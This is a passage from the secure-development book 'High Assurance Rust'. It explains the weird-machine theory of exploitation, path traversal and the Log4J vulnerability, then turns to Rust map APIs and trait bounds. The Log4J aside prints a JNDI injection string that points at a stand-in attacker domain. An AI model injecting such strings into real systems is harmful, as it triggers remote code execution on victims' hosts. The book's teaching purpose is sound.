<p><a href="https://doc.rust-lang.org/std/ffi/struct.CString.html"><em>Struct <code>std::ffi::CString</code></em></a>. The Rust Team (Accessed 2023). <a href="#fr-CString-1">↩</a></p>
</li>
<li id="footnote-CWE843">
<p><a href="https://cwe.mitre.org/data/definitions/843"><em>CWE-843: Access of Resource Using Incompatible Type ('Type Confusion')</em></a>. MITRE Corporation (Accessed 2022). Our type [un]safety code snippet is based on the example provided therein. <a href="#fr-CWE843-1">↩</a></p>
</li>
<li id="footnote-PreTrick">
<p><a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/Preprocessor-Options.html#Preprocessor-Options"><em>3.13 Options Controlling the Preprocessor</em></a>. The GNU Project (Accessed 2021). When debugging macro-heavy C code, it's sometimes helpful to run the preprocessor to see what macros expand to. <code>gcc</code>'s <code>-E</code> flag does this expansion. <a href="#fr-PreTrick-1">↩</a></p>
</li>
<li id="footnote-HygienicMacro">
<p><a href="https://en.wikipedia.org/wiki/Hygienic_macro"><em>Hygienic macro</em></a>. Wikipedia (Accessed 2022). <a href="#fr-HygienicMacro-1">↩</a></p>
</li>
<li id="footnote-KafkaCVE">
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25194">CVE-2023-25194</a>. MITRE (Accessed 2023). <a href="#fr-KafkaCVE-1">↩</a></p>
</li>
<li id="footnote-Log4J">
<p><a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"><em>Apache Log4j Vulnerability Guidance</em></a>. CISA (2021). <a href="#fr-Log4J-1">↩</a></p>
</li>
<li id="footnote-DOA">
<p>The <em>almost</em> caveat is here to account for "Data-Oriented Attacks". As the name implies, these attacks manipulate non-control data (like variable values and non-function pointers) to leak information, degrade performance, or even escalate privilege. We'll discuss data-oriented attacks briefly in the context of language-agnostic mitigations, but we won't have any code examples in this book. These attacks tend to be far less general and less common than control-flow hijacking attacks. <a href="#fr-DOA-1">↩</a></p>
</li>
<li id="footnote-DeepMitigations">
<p><a href="https://ieeexplore.ieee.org/abstract/document/8806725"><em>Challenges in Designing Exploit Mitigations for Deeply Embedded Systems</em></a>. Ali Abbasi, Jos Wetzels, Thorsten Holz, Sandro Etalle (2019). <a href="#fr-DeepMitigations-1">↩</a></p>
</li>
<li id="footnote-JITSoK">
<p><a href="https://www.usenix.org/system/files/conference/woot18/woot18-paper-gawlik.pdf"><em>SoK: Make JIT-Spray Great Again</em></a>. Robert Gawlik, Thorsten Holz (2018). <a href="#fr-JITSoK-1">↩</a></p>
</li>
<li id="footnote-XGadget">
<p><a href="https://github.com/entropic-security/xgadget"><code>xgadget</code></a>. Tiemoko Ballo and contributors (Accessed 2022). We wish we had more free time to work on this open-source tool for Return-Oriented Programming (ROP) and Jump-Oriented Programming (JOP) exploit development. <a href="#fr-XGadget-1">↩</a></p>
</li>
<li id="footnote-Homoicon">
<p><a href="https://en.wikipedia.org/wiki/Homoiconicity"><em>Homoiconicity</em></a>. Wikipedia (Accessed 2022). <a href="#fr-Homoicon-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="an-attackers-perspective-unifying-theory-2-of-2"><a class="header" href="#an-attackers-perspective-unifying-theory-2-of-2">An Attacker's Perspective: Unifying Theory (2 of 2)</a></h1>
<p>A motivated adversary has the time and resources to discover vulnerabilities.
And weaponize the corresponding exploits.
In industry, we see evidence constantly.
A stream of CVEs/PoCs and patches gets logged in release notes.
Companies are plagued by breaches and incidents, users by malware and fraud.
From Google's analysis<sup class="footnote-reference" id="fr-ProjZero2021Review-1"><a href="#footnote-ProjZero2021Review">1</a></sup> of exploits used in the wild:</p>
<blockquote>
<p>Memory corruption vulnerabilities have been the standard for attacking software for the last few decades and it's still how attackers are having success.</p>
</blockquote>
<p>Software assurance is broader in scope than vulnerability elimination.
To paraphrase the <a href="https://highassurance.rs/chp2/_index.html#software-assurance">full DoD definition</a> from chapter 2 - <strong>assurance</strong> is a level of confidence that a specific software<sup class="footnote-reference" id="fr-DoD-1"><a href="#footnote-DoD">2</a></sup>:</p>
<ol>
<li><em>"is free of vulnerabilities"</em></li>
<li><em>"functions as intended"</em></li>
</ol>
<p>Memory and type safety violations can compromise both (1) security and (2) general functionality.
They <em>degrade confidence significantly</em> for <em>both</em> the above assurance criteria.</p>
<blockquote>
<p><strong>By the way, what's the inspiration for this book's title?</strong></p>
<p>"High Assurance" is not a standard term, it means different things to different people.
Could debate whether or not its a suitable title for this book!</p>
<p>Our title draws inspiration from a 2014 DARPA research program<sup class="footnote-reference" id="fr-HACMSMain-1"><a href="#footnote-HACMSMain">3</a></sup>.
The "High Assurance Cyber Military Systems (HACMS)" program investigated applications of formal methods to cyber-physical embedded systems.
With the goal of using principled, mathematically rigorous approaches to gain confidence in the security and functionality of critical software (software assurance).</p>
<p>The program investigated a wide range of approaches and techniques<sup class="footnote-reference" id="fr-HACMSPaper-1"><a href="#footnote-HACMSPaper">4</a></sup>.
One participating team invented a Domain Specific Language (DSL)<sup class="footnote-reference" id="fr-Galois-1"><a href="#footnote-Galois">5</a></sup>.
This functional, Haskell-like language had two important properties:</p>
<ol>
<li>
<p><strong>Memory safe</strong> - Strong guarantee that the output executable would not contain spatial or temporal memory safety violations.</p>
</li>
<li>
<p><strong>No heap usage</strong> - Only static and stack memory is used during program execution. Bolstering reliability (worst case execution time not dependent on heap state, operations cannot fail due to heap exhaustion) and portability (programs can be deployed on tiny microcontrollers).</p>
</li>
</ol>
<p>Those DSL properties should sound awfully familiar.
Rust can largely achieve (1) with the <code>#![forbid(unsafe_code)]</code> attribute and (2) with <code>#![no_std]</code>.</p>
<p>It's tempting to claim that Rust is a commercially-viable, increasingly-popular programming language which can achieve the same assurance criteria as a novel DSL in a relatively-recent, cutting-edge, government-funded research program.
That's an extraordinary claim.</p>
<p>But is it actually true?
How exactly, in terms of concrete implementation, can a programmer achieve those high assurance properties?
What context, limitations, and insights underpin this goal?
More importantly, can we combine Rust with other open-source tools, industry best practices, and research findings to push the assurance level <em>even higher</em>?</p>
</blockquote>
<h2 id="building-a-mental-framework-for-exploitation"><a class="header" href="#building-a-mental-framework-for-exploitation">Building a Mental Framework for Exploitation</a></h2>
<p>We're going to stray into theoretical territory for a bit.
Don't worry, there'll be a hands-on exercise later in the chapter.
But first - things are going to be abstract, even <em>weird</em>.</p>
<p>Consider the potential behaviors of a program, across all possible executions, visualized as overlapping sets <sup class="footnote-reference" id="fr-SetNote-1"><a href="#footnote-SetNote">6</a></sup>:</p>
</br>
<p align="center">
  <img width="80%" src="chp4/behavior_concentric.svg">
  <figure>
  <figcaption><center>Conceptualizing assurance relative to kinds of behavior a program may exhibit across all possible executions.</center></figcaption><br>
  </figure>
</p>
<p>In the context of binary exploitation, we can think of exploits as malicious behavior that's a strict subset<sup class="footnote-reference" id="fr-ExpSub-1"><a href="#footnote-ExpSub">7</a></sup> of Undefined Behavior (UB).</p>
<p>For exploitation generally, outside of memory safety violations, there may be no subset relation. Perhaps the malicious set only intersects the UB set and the actual set (three overlapping circles, without two concentric).</p>
<ul>
<li>Example exploit: <strong>path/directory traversal</strong><sup class="footnote-reference" id="fr-DirTrav-1"><a href="#footnote-DirTrav">8</a></sup>. In a client-server context, returning a file by path is defined, intended behavior. But if a sensitive file is exposed to a less-trusted client - we may have a critical vulnerability. Especially if the client can write the file.</li>
</ul>
<p>What is a path traversal attack, exactly?
OWASP offers a clear definition<sup class="footnote-reference" id="fr-DirTrav-2"><a href="#footnote-DirTrav">8</a></sup>, excerpt:</p>
<blockquote>
<p>By manipulating variables that reference files with "dot-dot-slash (../)" sequences and its variations or by using absolute file paths, it may be possible to <strong>access arbitrary files</strong> and directories stored on [the] file system including <strong>application source code</strong> or <strong>configuration</strong> and critical <strong>system files</strong>...</p>
</blockquote>
<p>Consider the scenario labeled <strong>Actual Behavior (Average Assurance)</strong> in the above diagram.
Even if the program passes all tests and works most of the time, there are cases in which it may fail in production (e.g. an inexplicable error, the rare race condition, any prior or future vulnerability)<sup class="footnote-reference" id="fr-UBNote-1"><a href="#footnote-UBNote">9</a></sup>.</p>
<p>Ideally, a program would maintain correct function for any input and under any circumstance.
It's set of behaviors would:</p>
<ul>
<li>
<p>Intersect with <em>every correct action</em> the actual set contains (above diagram not to scale).</p>
</li>
<li>
<p>Implement <em>additional correct behavior</em>, covering use cases and edge cases the actual set fails to.</p>
</li>
<li>
<p>Be <em>mutually exclusive</em> from the undefined set - including its malicious subset.</p>
</li>
</ul>
<p>This scenario is labeled <strong>Ideal Behavior (Highest Assurance)</strong> above.
No such ideal program exists.
Our goal, as defenders and developers of high assurance software, is to <em>approximate this ideal set</em> as closely as possible.</p>
<p>But for the remainder of this section we'll return to the attackers perspective.
We're going to dig deeper into that red circle - the malicious set.</p>
<h2 id="the-weird-machine-theory-of-exploitation"><a class="header" href="#the-weird-machine-theory-of-exploitation">The "Weird Machine" Theory of Exploitation</a></h2>
<p>What do memory corruption exploits (e.g. control flow hijacking, code injection, code reuse) have in common?
At a fundamental level, they're means by which an attacker <em>re-writes</em> part of your program.
Or, as one school of thought frames it, attackers develop for a tiny, constrained machine <em>inside</em> of your program.
Bratus et. al.<sup class="footnote-reference" id="fr-WeirdMachine-1"><a href="#footnote-WeirdMachine">10</a></sup> pose that an abstract "weird machine" executes the attacker's data/code.</p>
<p>This conceptualization might make more sense if we start from what a "normal machine"<sup class="footnote-reference" id="fr-IFSM-1"><a href="#footnote-IFSM">11</a></sup> looks like.
We'll use network sockets as an example and diagram two state machines: one normal, one weird.</p>
<blockquote>
<p><strong>Network Socket Basics</strong></p>
<p>Sockets are a way to represent the endpoint of a network connection.
They allow processes to treat sending/receiving data over a network much like writing/reading a local file.
Regardless of the underlying network protocol.</p>
<p>Socket communication assumes two kinds of entities: a client and server.
Clients are active, they initiate connection requests on a user's behalf.
Servers are passive, they wait to receive a connection before serving the requested content.</p>
</blockquote>
<p>Imagine a web server which uses the POSIX sockets API<sup class="footnote-reference" id="fr-PosixSock-1"><a href="#footnote-PosixSock">12</a></sup> to accept incoming network connections.
This standard interface describes sockets as having five states:</p>
<ol>
<li><strong>Ready</strong> - an initial state for a newly created socket.</li>
<li><strong>Bound</strong> - bound to a network address (likely IP and port number).</li>
<li><strong>Listening</strong> - listening for incoming connections.</li>
<li><strong>Open</strong> - ready to send and receive data (stays in this state while actually transmitting).</li>
<li><strong>Closed</strong> - no longer active, the session has ended.</li>
</ol>
<p>Visually, we can represent a server's socket as the below Finite State Machine (FSM).
We assume it encodes <strong>Actual Behavior</strong>.</p>
</br>
<p align="center">
  <img width="80%" src="chp4/socket_state_machine.svg">
  <figure>
  <figcaption><center>POSIX Socket API FSM (server focus)</center></figcaption><br>
  </figure>
</p>
<p>An average user's requests are processed by this <em>normal machinery</em>:</p>
<ul>
<li>
<p>The server starts up ("Ready"), binds a socket, and begins listening for requests ("Bound" -&gt; "Listening" transition above).</p>
</li>
<li>
<p>A user connects to request a given webpage - at which point the server accepts the connection, opens the socket ("Listening" -&gt; "Open") and transmits the requested content (staying "Open").</p>
</li>
<li>
<p>With transmission complete, the socket is closed ("Open" -&gt; "Closed"). Page contents render in the client user's browser.</p>
</li>
</ul>
<p>Nothing untoward occurs.</p>
<p>Now imagine this server has been misconfigured: it reports its exact software and version number when an error page is hit by any client (information leakage, poor operational assurance).
Now an attacker can "fingerprint" the server's software.</p>
<p>Worse yet: say the reported version is out of date - it contains a spatial memory safety vulnerability in the web server's request parsing logic.
This particular software version uses a fixed-size stack buffer to process a certain HTTP header that, when well formed, should comfortably fit.</p>
<p>But there's no bounds check on string copy into the buffer.</p>
<p>An attacker creates a specially crafted request that overflows the buffer, leverages code re-use to call <code>libc</code> functions, and ultimately spawns a shell that will take additional and arbitrary commands over the active socket.
Here, request data has been processed by a <em>weird machine</em>!</p>
<ul>
<li>
<p>Memory safety is broken (vulnerability), the overly-long header field's data becomes code interpreted as a sort of ad hoc, secondary program.</p>
</li>
<li>
<p>Each snippet of data written past the end of the buffer becomes a "weird instruction" borrowed from the code already present (code reuse).</p>
</li>
<li>
<p>A sequence of such instructions co-opts program execution and forces the CPU under the control of a weird program's state machine (exploit).</p>
</li>
</ul>
<p>In our example, the weird machine has two states:</p>
<ol>
<li><strong>Buffering</strong> - receiving characters to build a command string.</li>
<li><strong>Executing</strong> - running a command as a shell subprocess.</li>
</ol>
<p>A 2nd, malicious, shadow-machine is always present just beneath the surface.
Just waiting to be activated, to emerge.
In any non-ideal program.</p>
<p>Visually, we transition to the weird machine from the normal machine's "Open" state if an exploit payload is received by the server.
Recall we assumed <strong>Actual Behavior</strong> - in reality that means overlap with two other families of behaviors:</p>
<ul>
<li>
<p>The vulnerable header field parsing happened in the open state. This state introduced <strong>Undefined Behavior (UB)</strong>.</p>
</li>
<li>
<p>An attacker leveraged UB to craft an exploit. Programming their own <strong>Malicious Behavior</strong> finite state machine.</p>
</li>
</ul>
</br>
<p align="center">
  <img width="100%" src="chp4/socket_weird_machine.svg">
  <figure>
  <figcaption><center>Weird machine ("Attacker FSM") programmed via remote exploit payload against normal machine ("Programmer FSM").</center></figcaption><br>
  </figure>
</p>
<p>Finding and executing a weird machine like this one is proof-by-counterexample for the insecurity of a program.
To quote Bratus et. al., exploits demonstrate<sup class="footnote-reference" id="fr-WeirdMachine-2"><a href="#footnote-WeirdMachine">10</a></sup>:</p>
<blockquote>
<p>...an <em>execution model and mechanism</em> that is explicitly or implicitly present in the attacked environment - unbeknownst to most of its users or administrators...The attack then comes as a <em>constructive proof</em> that such unforeseen computations are indeed possible, and therefore as <em>evidence</em> that the target actually includes the described [weird] execution model.</p>
<p><em>Exploit programming</em> has been a productive empirical study of these accidental or unanticipated machines and models and of the ways they emerge from bugs, composition, and cross-layer interactions.</p>
</blockquote>
<p>For readers wanting a formal proof, Dullien further solidifies the weird machine model with mathematical rigor<sup class="footnote-reference" id="fr-FormalWeirdness-1"><a href="#footnote-FormalWeirdness">13</a></sup>. Notably, Dullien's work differs from our coverage of exploitation in two interesting ways:</p>
<ol>
<li>
<p>He offers a formal proof of <em>non-exploitability</em> for a theoretical program's finite state machine. To demonstrate that such a proof is possible to construct under specific constraints, even if impractical.</p>
<ul>
<li>We do not attempt to prove non-exploitability for any programs in this book. Regardless - this is a powerful idea significant to our understanding computer security as a science.</li>
</ul>
</li>
<li>
<p>He demonstrates the exploitability (proof-by-counterexample) of a different implementation of that same theoretical program <em>without</em> altering control flow.</p>
<ul>
<li>We won't demonstrate any exploit maintaining perfect control flow integrity in this book. Just know that "data-oriented attacks" are possible (even if uncommon) examples of weird machine programming.</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>Weird Machines are Universal</strong></p>
<p>There's more than one way to skin a <del>cat</del> state machine.
We contextualized the above diagram within binary exploitation, but it would accurately represent memory-safe command injection.
In fact, Java's Log4J CVE-2021-44228<sup class="footnote-reference" id="fr-Log4J-1"><a href="#footnote-Log4J">14</a></sup> enables a stable, widely applicable weird machine with similar Remote Code Execution (RCE) semantics.</p>
<p>At a high-level, Log4J exploitation works like this<sup class="footnote-reference" id="fr-ComputerphileLog4J-1"><a href="#footnote-ComputerphileLog4J">15</a></sup>:</p>
<ul>
<li>
<p>Production-grade software leverages logging frameworks to aid with error diagnosis, anomaly detection, and system monitoring. Apache Log4j is a leading logging library for Java, so it's nearly ubiquitous in-the-wild.</p>
</li>
<li>
<p>Log4j supports a macro-like syntax for meta-programming of log messages. For example, the string <code>${java:version}</code> would be expanded and logged as <code>Java version X.Y.Z_XYZ</code> - fingerprinting the host's currently installed Java software.</p>
</li>
<li>
<p>Many log sites in a codebase write external, attacker-controlled values directly into the logged string. A host's User Agent is one example, since it can be configured. Coupled with expansion/meta-programming, we lose a <strong>non-repudiation</strong> property - the attacker controls log message contents and can falsify data to cover their tracks.</p>
</li>
<li>
<p>It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like <code>${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}</code> into a log<sup class="footnote-reference" id="fr-HutchinsLog4J-1"><a href="#footnote-HutchinsLog4J">16</a></sup>, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.</p>
</li>
</ul>
<p>In this example of command injection, the weird machine is programmed with a specially crafted string addressing an attacker-controlled server.
Untrusted log data becomes code executed with the privileges of the victim process.</p>
<p>The vulnerability is not a memory safety violation, it's a configuration flaw: an unintended composition of esoteric features that should have been disabled by default.
It could have happened within a Rust logging library, if one offered an equivalent feature set that likewise wasn't securely designed.</p>
</blockquote>
<h2 id="takeaway-18"><a class="header" href="#takeaway-18">Takeaway</a></h2>
<p>The behavior of any realistic, sufficiently large program includes <em>some</em> Undefined Behavior (UB).
This is also true for Rust programs - unless every last dependency is <code>#![forbid(unsafe_code)]</code>, no CFFI functions are called, and none of the program's code triggers a known or unknown bug <code>rustc</code> itself.</p>
<p>In binary exploitation, an attacker leverages UB to elicit malicious behavior.
They co-opt program execution to perform nefarious operations.</p>
<p>That's possible because almost all programs contain the building blocks of another, unintended program.
Those building blocks constitute a "weird machine".
When attackers write working exploits, they're, in essence, developing a new application for this inner machine.</p>
<p>In the abstract game that is computer security, an attacker wins if they can successfully leverage any weird machine they discover.
In practice, a defender cannot eliminate weird machines entirely.
From an computability perspective, turing-completeness<sup class="footnote-reference" id="fr-TuringComplete-1"><a href="#footnote-TuringComplete">17</a></sup> gives the attacker a significant advantage.</p>
<p>Defenders strive to reduce and/or detect possible transitions out of the normal states and into the weird ones.
Strongly-enforced memory and type-safety eliminate <em>a great deal</em> of possible transitions to malicious states.</p>
<p>With that high-level conceptualization in mind, let's learn our way around a debugger and start dabbling in weird machine development ourselves.</p>
<!--
In the next section, we'll put these concepts into play hands-on to reduce secret exposure on an untrusted host.
-->
<hr>
<ol class="footnote-definition"><li id="footnote-ProjZero2021Review">
<p><a href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html"><em>The More You Know, The More You Know You Don't Know</em></a>. Maddie Stone, Google Project Zero (2022). <a href="#fr-ProjZero2021Review-1">↩</a></p>
</li>
<li id="footnote-DoD">
<p><a href="https://www.acqnotes.com/Attachments/DoD%20Software%20Assurance%20Initiative.pdf"><em>DoD Software Assurance Initiative</em></a>. Mitchell Komaroff, Kristin Baldwin (2005, Public Domain) <a href="#fr-DoD-1">↩</a></p>
</li>
<li id="footnote-HACMSMain">
<p><a href="https://www.darpa.mil/program/high-assurance-cyber-military-systems"><em>High-Assurance Cyber Military Systems (HACMS) (Archived)</em></a>. DARPA (Accessed 2023). <a href="#fr-HACMSMain-1">↩</a></p>
</li>
<li id="footnote-HACMSPaper">
<p><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5597724/pdf/rsta20150401.pdf"><em>The HACMS program: using formal methods to eliminate exploitable bugs</em></a>. Kathleen Fisher, John Launchbury, Raymond Richards (2017). <a href="#fr-HACMSPaper-1">↩</a></p>
</li>
<li id="footnote-Galois">
<p><a href="https://galois.com/project/hacms-high-assurance-cyber-military-systems/"><em>HACMS (High-Assurance Cyber Military Systems)</em></a>. Galois (Accessed 2023). <a href="#fr-Galois-1">↩</a></p>
</li>
<li id="footnote-SetNote">
<p>Note the behavior of any given program of sufficient complexity, in all likelihood, is a large set that has <em>some</em> overlap with both the malicious and undefined sets. Remember we're talking about all possible executions - for any possible input - and there is no absolute security. Nor absolute assurance. <a href="#fr-SetNote-1">↩</a></p>
</li>
<li id="footnote-ExpSub">
<p>This assumption doesn't always hold. For example, command injection vulnerabilities (e.g. Log4J) make for extremely reliable and powerful exploits yet their effects are defined as far as a language specification is concerned. We still have a well-defined program that faithfully executed the provided command - it just wasn't the author-intended command! <a href="#fr-ExpSub-1">↩</a></p>
</li>
<li id="footnote-DirTrav">
<p><a href="https://owasp.org/www-community/attacks/Path_Traversal"><em>Path Traversal</em></a>. OWASP (Accessed 2023). <a href="#fr-DirTrav-1">↩</a> <a href="#fr-DirTrav-2">↩2</a></p>
</li>
<li id="footnote-UBNote">
<p>Recall the concept of a UB "time bomb" from Chapter 3 - a program can work as expected despite relying on UB. At least until a subtle change in toolchain or a specially crafted input triggers it. <a href="#fr-UBNote-1">↩</a></p>
</li>
<li id="footnote-WeirdMachine">
<p><a href="https://www.usenix.org/system/files/login/articles/105516-Bratus.pdf"><em>Exploit Programming: From Buffer Overflows to "Weird Machines" and Theory of Computation</em></a>. Sergey Bratus, Michael Locasto, Meredith Patterson, Len Sassaman, and Aanna Shubina (2011). <a href="#fr-WeirdMachine-1">↩</a> <a href="#fr-WeirdMachine-2">↩2</a></p>
</li>
<li id="footnote-IFSM">
<p>What we call the "normal machine" is what Dullien<sup class="footnote-reference" id="fr-FormalWeirdness-2"><a href="#footnote-FormalWeirdness">13</a></sup> refers to as the <em>Intended Finite State Machine (IFSM).</em> We can think of any software program as an <em>approximation</em> of an abstract IFSM (here, the states of an ideal POSIX web server) emulated atop a CPU's low-level FSM (as specified by architecture manuals). "Approximation" because programs have bugs. The subset of bugs which are vulnerabilities allow breaking out of IFSM states and into emergent, weird FSM states. <a href="#fr-IFSM-1">↩</a></p>
</li>
<li id="footnote-PosixSock">
<p><a href="https://en.wikipedia.org/wiki/Berkeley_sockets"><em>Berkeley sockets</em></a>. Wikipedia (Accessed 2022). <a href="#fr-PosixSock-1">↩</a></p>
</li>
<li id="footnote-FormalWeirdness">
<p><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8226852"><em>Weird Machines, Exploitability, and Provable Unexploitability</em></a>. Thomas Dullien (2017). <a href="#fr-FormalWeirdness-1">↩</a> <a href="#fr-FormalWeirdness-2">↩2</a></p>
</li>
<li id="footnote-Log4J">
<p><a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"><em>Apache Log4j Vulnerability Guidance</em></a>. CISA (2021). <a href="#fr-Log4J-1">↩</a></p>
</li>
<li id="footnote-ComputerphileLog4J">
<p><a href="https://www.youtube.com/watch?v=Opqgwn8TdlM"><em>Log4J &amp; JNDI Exploit: Why So Bad?</em></a>. Computerphile (2021). <a href="#fr-ComputerphileLog4J-1">↩</a></p>
</li>
<li id="footnote-HutchinsLog4J">
<p><a href="https://www.youtube.com/watch?v=0-abhd-CLwQ"><em>Log4j (CVE-2021-44228) RCE Vulnerability Explained</em></a>. Marcus Hutchins (2021). <a href="#fr-HutchinsLog4J-1">↩</a></p>
</li>
<li id="footnote-TuringComplete">
<p><a href="https://en.wikipedia.org/wiki/Turing_completeness"><em>Turing Completeness</em></a>. Wikipedia (Accessed 2022). <a href="#fr-TuringComplete-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rusts-memory-safety-guarantees"><a class="header" href="#rusts-memory-safety-guarantees">Rust's Memory Safety Guarantees</a></h1>
<blockquote>
<p><strong>Note:</strong> This section is a work-in-progress.
For a preview, please see this blog post:</p>
<p><a href="https://tiemoko.com/blog/blue-team-rust/">Blue Team Rust: What is "Memory Safety", Really?</a></p>
</blockquote>
</br>
<p align="center">
  <img width="100%" src="chp4/mem_safety_block.svg">
  <figure>
  <figcaption><center>An overview of Rust's memory safety model.</center></figcaption><br>
  </figure>
</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="interface-relevant-traits"><a class="header" href="#interface-relevant-traits">Interface-relevant Traits</a></h1>
<p>The library we're building is an alternative to two collections in Rust's standard library: <code>BTreeSet</code><sup class="footnote-reference" id="fr-BTreeSet-1"><a href="#footnote-BTreeSet">1</a></sup> and <code>BTreeMap</code><sup class="footnote-reference" id="fr-BTreeMap-1"><a href="#footnote-BTreeMap">2</a></sup>.
Our goal is to provide the same well-known, idiomatic APIs but with maximal safety (for any system) and bare metal portability (for firmware and/or tiny microcontrollers).</p>
<p>To get there, we need to understand a bit about the design of the standard library's APIs.
Specifically the <em>traits</em> these APIs bind to their <em>generic</em> arguments.
These design decisions shape an interplay of usability and resource management.</p>
<p>API design is a concern orthogonal to the algorithms of our particular data structure, so let's tackle it first.
To achieve feature-parity with the standard library, we'll deepen our understanding of how Rust works "under-the-hood".</p>
<blockquote>
<p><strong>What are generics and traits, again?</strong></p>
<p>We introduced the concepts and syntax in chapter 3.
To jog your memory:</p>
<ul>
<li>
<p><strong>Generics</strong> (e.g. <code>T</code> standing in for concrete type <code>u64</code> or <code>u32</code>) eliminate the need for code duplication. A single function's source code can be used, by the compiler, to generate one machine-code equivalent for each concrete type that function is called with (monomorphization).</p>
</li>
<li>
<p><strong>Traits</strong> (e.g <code>T: Ord</code> for a type that can be sorted and compared) define behavior shared among different types. They're similar to interfaces and abstract bases classes of other languages.</p>
</li>
</ul>
<p>We often combine the two by binding traits to generic arguments and/or return values.
This allows us to write a single function that our users can leverage for any [generic] type implementing some behavior (one or more specific traits). Even custom types that haven't been invented yet!</p>
</blockquote>
<h2 id="the-map-get-api"><a class="header" href="#the-map-get-api">The Map <code>get</code> API</a></h2>
<p>A <em>map</em> (aka an <em>associative array</em> or <em>symbol table</em>) is a data structure that stores key-value pairs.
Keys are unique and values can be quickly looked up by key.</p>
<p>Rust's <code>BTreeMap</code><sup class="footnote-reference" id="fr-BTreeMap-2"><a href="#footnote-BTreeMap">2</a></sup> is an <em>ordered map</em>, it supports any key type that has a notion of <em>total order</em><sup class="footnote-reference" id="fr-TotalOrder-1"><a href="#footnote-TotalOrder">3</a></sup>.
Colloquially, that means keys can be compared with logical operators (<code>&gt;</code>, <code>&lt;=</code>, <code>==</code>, etc) and sorted.
Because they implement the <code>Ord</code> trait.
If keys can't be ordered but are hashable, you'd want to use a <code>HashMap</code><sup class="footnote-reference" id="fr-HashMap-1"><a href="#footnote-HashMap">4</a></sup> instead.</p>
<p>Say we want to perform a lookup in an ordered map - to get the value associated with a given key, if any.
A <code>get</code> method should take a reference to a key as input, and return an <code>Option</code> (containing a value reference for the <code>Some</code> case, when the key is found).</p>
<p>That's how the standard library works, here's the official example<sup class="footnote-reference" id="fr-BTreeMapGet1-1"><a href="#footnote-BTreeMapGet1">5</a></sup>:</p>
<pre><code class="language-rust noplaypen">use std::collections::BTreeMap;

let mut map = BTreeMap::new();
map.insert(1, "a");
assert_eq!(map.get(&amp;1), Some(&amp;"a"));
assert_eq!(map.get(&amp;2), None);</code></pre>
<p>Based on the above, you might expect the <code>get</code> method's signature to look like this for <code>BTreeMap&lt;K, V&gt;</code>:</p>
<pre><code class="language-rust ignore">impl&lt;K, V&gt; BTreeMap&lt;K, V&gt; {
    /// Returns a reference to the value corresponding to the key.
    pub fn get(&amp;self, key: &amp;K) -&gt; Option&lt;&amp;V&gt;
    where
        K: Ord
    {
        // ...function body here...
    }
    // ... rest of the methods
}
</code></pre>
<p>But it doesn't.
The real <code>get</code> method has this signature<sup class="footnote-reference" id="fr-BTreeMapGet2-1"><a href="#footnote-BTreeMapGet2">6</a></sup>:</p>
<pre><code class="language-rust ignore">impl&lt;K, V&gt; BTreeMap&lt;K, V&gt; {
    /// Returns a reference to the value corresponding to the key.
    pub fn get&lt;Q&gt;(&amp;self, key: &amp;Q) -&gt; Option&lt;&amp;V&gt;
    where
        K: Borrow&lt;Q&gt; + Ord,
        Q: Ord + ?Sized,
    {
        // ...function body here...
    }
    // ... rest of the methods
}</code></pre>
<p>Why are there two different generics types at play?
And what are all those strange looking trait bounds?</p>
<p>Let's build our way up to answering those questions by explaining each trait individually.
If you can understand this API, you're well on your way to understanding idiomatic use of traits in general.</p>
<h3 id="the-ord-trait"><a class="header" href="#the-ord-trait">The <code>Ord</code> Trait</a></h3>
<p><code>Ord</code><sup class="footnote-reference" id="fr-Ord-1"><a href="#footnote-Ord">7</a></sup> is the simplest of the three traits in <code>get</code>'s signature, and one we've already discussed.
When a type implements <code>Ord</code>, it can be ordered<sup class="footnote-reference" id="fr-TotalOrd-1"><a href="#footnote-TotalOrd">8</a></sup>.
We can compare one value of this type to another and determine if the two are equal or if one is greater than the other.
